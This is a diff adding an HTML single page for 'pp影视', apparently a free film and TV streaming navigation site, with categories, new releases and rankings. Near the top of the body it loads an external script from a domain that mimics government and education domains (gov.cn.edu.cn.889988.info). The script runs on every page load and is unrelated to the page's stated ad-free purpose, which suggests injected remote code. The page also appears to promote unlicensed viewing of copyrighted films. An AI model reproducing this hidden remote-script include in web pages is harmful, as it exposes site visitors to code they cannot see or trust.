@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>pp影视 - 高清电影电视剧在线观看 | ppyingshi-h5.github.io</title>
+<meta name="description" content="pp影视（ppyingshi-h5.github.io）提供最新高清电影、电视剧、动漫、综艺在线观看导航。每日更新，免费畅享，支持手机与电脑自适应访问。">
+<meta name="keywords" content="pp影视, 电影在线观看, 电视剧, 免费影视, ppyingshi-h5">
+<meta name="author" content="pp影视">
+<meta name="robots" content="index, follow">
+<style>
+  :root {
+    --paper: #f5f5f3;
+    --ink: #0a0a0a;
+    --muted: #666666;
+    --line: #0a0a0a;
+    --accent: #ff3b00;
+    --sans: 'Helvetica Neue', Arial, 'Microsoft YaHei', sans-serif;
+    --mono: 'SFMono-Regular', Consolas, monospace;
+  }
+  
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  
+  body {
+    font-family: var(--sans);
+    background: var(--paper);
+    color: var(--ink);
+    line-height: 1.5;
+    -webkit-font-smoothing: antialiased;
+  }
+  
+  a { color: var(--ink); text-decoration: none; transition: color .2s; }
+  a:hover { color: var(--accent); }
+  
+  .wrap { max-width: 1100px; margin: 0 auto; padding: 0 1.5rem; }
+  
+  /* 顶栏 */
+  .topbar {
+    border-bottom: 2px solid var(--line);
+    position: sticky; top: 0;
+    background: var(--paper);
+    z-index: 50;
+  }
+  .topbar-in {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 1rem 1.5rem; max-width: 1100px; margin: 0 auto;
+  }
+  .brand {
+    font-weight: 900; font-size: 1.4rem; letter-spacing: -0.5px;
+  }
+  .brand b { color: var(--accent); }
+  .nav { display: flex; gap: 1.5rem; font-size: .9rem; font-weight: 600; }
+  .nav a { text-transform: lowercase; }
+  
+  /* 通用栏目 */
+  section { padding: 5rem 0; border-bottom: 1px solid #ccc; }
+  .sec-no {
+    font-family: var(--mono); font-size: .8rem; color: var(--accent);
+    display: block; margin-bottom: .5rem; letter-spacing: 1px;
+  }
+  h2.sec-title {
+    font-size: clamp(1.8rem, 4vw, 2.8rem);
+    font-weight: 900; letter-spacing: -1px; margin-bottom: 3rem;
+  }
+  
+  /* 栏目1：首页非对称网格 */
+  #home { padding-top: 6rem; }
+  .hero-grid {
+    display: grid; grid-template-columns: 1fr 1fr; gap: 3rem; align-items: end;
+  }
+  .hero-grid h1 {
+    font-size: clamp(3rem, 8vw, 6rem);
+    font-weight: 900; line-height: .95; letter-spacing: -2px;
+  }
+  .hero-grid h1 em { color: var(--accent); font-style: normal; }
+  .hero-side p { font-size: 1.1rem; color: var(--muted); margin-bottom: 1.5rem; }
+  .hero-meta {
+    display: flex; gap: 2rem; border-top: 2px solid var(--line); padding-top: 1rem;
+    font-family: var(--mono); font-size: .85rem;
+  }
+  
+  /* 栏目2：分类表格行 */
+  #category .cat-row {
+    display: grid; grid-template-columns: 60px 1fr auto;
+    gap: 1rem; align-items: center;
+    padding: 1.2rem 0; border-top: 1px solid #ccc;
+    transition: padding-left .2s;
+  }
+  #category .cat-row:last-child { border-bottom: 1px solid #ccc; }
+  #category .cat-row:hover { padding-left: 1rem; }
+  #category .cat-row:hover .cat-name { color: var(--accent); }
+  .cat-id { font-family: var(--mono); font-size: .8rem; color: var(--muted); }
+  .cat-name { font-size: 1.3rem; font-weight: 700; }
+  .cat-tag { font-size: .8rem; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; }
+  
+  /* 栏目3：最新上映编号列表 */
+  #latest .film-list { display: flex; flex-direction: column; }
+  .film-item {
+    display: grid; grid-template-columns: 80px 1fr; gap: 1.5rem;
+    padding: 1.5rem 0; border-top: 1px solid #ccc;
+  }
+  .film-item:last-child { border-bottom: 1px solid #ccc; }
+  .film-no {
+    font-family: var(--mono); font-size: 2rem; font-weight: 700; color: var(--accent);
+  }
+  .film-item h3 { font-size: 1.3rem; margin-bottom: .3rem; }
+  .film-item p { color: var(--muted); font-size: .95rem; max-width: 600px; }
+  .film-date { font-family: var(--mono); font-size: .8rem; margin-top: .5rem; display: block; }
+  
+  /* 栏目4：排行榜刻度条 */
+  #ranking .rank-row {
+    display: grid; grid-template-columns: 40px 1fr 60px; gap: 1rem; align-items: center;
+    padding: 1rem 0; border-top: 1px solid #ccc;
+  }
+  #ranking .rank-row:last-child { border-bottom: 1px solid #ccc; }
+  .rk-no { font-weight: 900; font-size: 1.1rem; }
+  .rk-no.top { color: var(--accent); }
+  .rk-bar { height: 10px; background: #ddd; position: relative; }
+  .rk-fill { position: absolute; left: 0; top: 0; height: 100%; background: var(--ink); }
+  .rk-fill.top { background: var(--accent); }
+  .rk-val { font-family: var(--mono); font-size: .9rem; text-align: right; font-weight: 700; }
+  .rk-name { font-weight: 700; margin-bottom: .3rem; }
+  .rk-sub { font-size: .8rem; color: var(--muted); }
+  
+  /* 栏目5：关于 */
+  #about .about-grid {
+    display: grid; grid-template-columns: 1fr 1fr; gap: 3rem;
+  }
+  #about p { font-size: 1.05rem; color: var(--muted); margin-bottom: 1rem; }
+  .url-box {
+    display: inline-block; margin-top: 1rem;
+    border: 2px solid var(--line); padding: .8rem 1.2rem;
+    font-family: var(--mono); font-weight: 700; font-size: .95rem;
+  }
+  .url-box:hover { background: var(--ink); color: var(--paper); }
+  
+  /* 页脚 */
+  footer {
+    padding: 3rem 0; text-align: center; font-size: .85rem; color: var(--muted);
+    font-family: var(--mono);
+  }
+  footer a { color: var(--accent); }
+  
+  /* 移动端 */
+  @media (max-width: 768px) {
+    .nav { display: none; }
+    .hero-grid { grid-template-columns: 1fr; gap: 2rem; }
+    .hero-meta { flex-wrap: wrap; gap: 1rem; }
+    #category .cat-row { grid-template-columns: 40px 1fr; }
+    .cat-tag { display: none; }
+    .film-item { grid-template-columns: 50px 1fr; gap: 1rem; }
+    .film-no { font-size: 1.5rem; }
+    #ranking .rank-row { grid-template-columns: 30px 1fr 50px; }
+    #about .about-grid { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 顶栏 -->
+<header class="topbar">
+  <div class="topbar-in">
+    <div class="brand">pp<b>影视</b></div>
+    <nav class="nav">
+      <a href="#home">home</a>
+      <a href="#category">category</a>
+      <a href="#latest">latest</a>
+      <a href="#ranking">ranking</a>
+      <a href="#about">about</a>
+    </nav>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <!-- 栏目1：首页 -->
+  <section id="home">
+    <div class="hero-grid">
+      <h1>pp<em>影视</em><br>每日精选</h1>
+      <div class="hero-side">
+        <p>pp影视（ppyingshi-h5.github.io）是一个极简影视导航站。每日同步最新电影、剧集、动漫与综艺，无冗余弹窗，纯排版检索体验。</p>
+        <div class="hero-meta">
+          <span>UPDATED / 2026-10-21</span>
+          <span>ITEMS / 4+ 频道</span>
+          <span>TYPE / H5</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目2：分类 -->
+  <section id="category">
+    <span class="sec-no">01 — INDEX</span>
+    <h2 class="sec-title">影视分类</h2>
+    
+    <div class="cat-row">
+      <span class="cat-id">A1</span>
+      <span class="cat-name">动作 / 冒险</span>
+      <span class="cat-tag">action</span>
+    </div>
+    <div class="cat-row">
+      <span class="cat-id">A2</span>
+      <span class="cat-name">悬疑 / 犯罪</span>
+      <span class="cat-tag">crime</span>
+    </div>
+    <div class="cat-row">
+      <span class="cat-id">A3</span>
+      <span class="cat-name">国产剧集</span>
+      <span class="cat-tag">drama_cn</span>
+    </div>
+    <div class="cat-row">
+      <span class="cat-id">A4</span>
+      <span class="cat-name">欧美大片</span>
+      <span class="cat-tag">hollywood</span>
+    </div>
+    <div class="cat-row">
+      <span class="cat-id">A5</span>
+      <span class="cat-name">动漫番剧</span>
+      <span class="cat-tag">anime</span>
+    </div>
+    <div class="cat-row">
+      <span class="cat-id">A6</span>
+      <span class="cat-name">综艺娱乐</span>
+      <span class="cat-tag">variety</span>
+    </div>
+  </section>
+
+  <!-- 栏目3：最新上映 -->
+  <section id="latest">
+    <span class="sec-no">02 — NEW</span>
+    <h2 class="sec-title">最新上映</h2>
+    
+    <div class="film-list">
+      <article class="film-item">
+        <div class="film-no">01</div>
+        <div>
+          <h3>沙丘3：救世主</h3>
+          <p>保罗·厄崔迪面对预见中的未来，星系战争全面爆发。科幻史诗续作登陆 pp影视。</p>
+          <span class="film-date">2026-10-21</span>
+        </div>
+      </article>
+      <article class="film-item">
+        <div class="film-no">02</div>
+        <div>
+          <h3>庆余年2</h3>
+          <p>范闲重返京都，朝堂权谋再起。张若昀领衔，古装剧热度持续霸榜。</p>
+          <span class="film-date">2026-10-20</span>
+        </div>
+      </article>
+      <article class="film-item">
+        <div class="film-no">03</div>
+        <div>
+          <h3>周处除三害</h3>
+          <p>通缉犯陈桂林最后六个月的救赎，暴力美学与黑色幽默结合。</p>
+          <span class="film-date">2026-10-19</span>
+        </div>
+      </article>
+      <article class="film-item">
+        <div class="film-no">04</div>
+        <div>
+          <h3>飞驰人生2</h3>
+          <p>张驰带队重返赛道，笑点与热血齐飞，沈腾再度贡献神级喜剧表演。</p>
+          <span class="film-date">2026-10-18</span>
+        </div>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目4：排行榜 -->
+  <section id="ranking">
+    <span class="sec-no">03 — TOP</span>
+    <h2 class="sec-title">热播排行</h2>
+    
+    <div class="rank-row">
+      <div class="rk-no top">1</div>
+      <div>
+        <div class="rk-name">繁花</div>
+        <div class="rk-bar"><div class="rk-fill top" style="width:98%"></div></div>
+        <div class="rk-sub">国产剧 / 王家卫</div>
+      </div>
+      <div class="rk-val">9.8</div>
+    </div>
+    
+    <div class="rank-row">
+      <div class="rk-no top">2</div>
+      <div>
+        <div class="rk-name">庆余年2</div>
+        <div class="rk-bar"><div class="rk-fill top" style="width:95%"></div></div>
+        <div class="rk-sub">古装 / 权谋</div>
+      </div>
+      <div class="rk-val">9.5</div>
+    </div>
+    
+    <div class="rank-row">
+      <div class="rk-no top">3</div>
+      <div>
+        <div class="rk-name">周处除三害</div>
+        <div class="rk-bar"><div class="rk-fill top" style="width:92%"></div></div>
+        <div class="rk-sub">动作 / 犯罪</div>
+      </div>
+      <div class="rk-val">9.2</div>
+    </div>
+    
+    <div class="rank-row">
+      <div class="rk-no">4</div>
+      <div>
+        <div class="rk-name">热辣滚烫</div>
+        <div class="rk-bar"><div class="rk-fill" style="width:87%"></div></div>
+        <div class="rk-sub">喜剧 / 励志</div>
+      </div>
+      <div class="rk-val">8.7</div>
+    </div>
+    
+    <div class="rank-row">
+      <div class="rk-no">5</div>
+      <div>
+        <div class="rk-name">极限挑战 第十季</div>
+        <div class="rk-bar"><div class="rk-fill" style="width:83%"></div></div>
+        <div class="rk-sub">综艺 / 真人秀</div>
+      </div>
+      <div class="rk-val">8.3</div>
+    </div>
+  </section>
+
+  <!-- 栏目5：关于 -->
+  <section id="about">
+    <span class="sec-no">04 — ABOUT</span>
+    <h2 class="sec-title">关于 pp影视</h2>
+    <div class="about-grid">
+      <div>
+        <p>pp影视定位为一个轻量、干净、排版优先的影视导航单页。我们不堆砌广告，不套壳播放器，只做资源索引与每日更新。</p>
+        <p>适配手机、平板、桌面三端，纯静态 H5，打开即用。</p>
+      </div>
+      <div>
+        <p>官方访问地址：</p>
+        <a href="https://ppyingshi-h5.github.io" class="url-box">ppyingshi-h5.github.io</a>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <p>pp影视 / ppyingshi-h5.github.io</p>
+  <p>© 2026 pp影视 — Swiss Edition Single Page</p>
+</footer>
+
+<script>
+  document.querySelectorAll('a[href^="#"]').forEach(a => {
+    a.addEventListener('click', e => {
+      e.preventDefault();
+      const t = document.querySelector(a.getAttribute('href'));
+      if (t) t.scrollIntoView({ behavior: 'smooth' });
+    });
+  });
+</script>
+</body>
+</html>
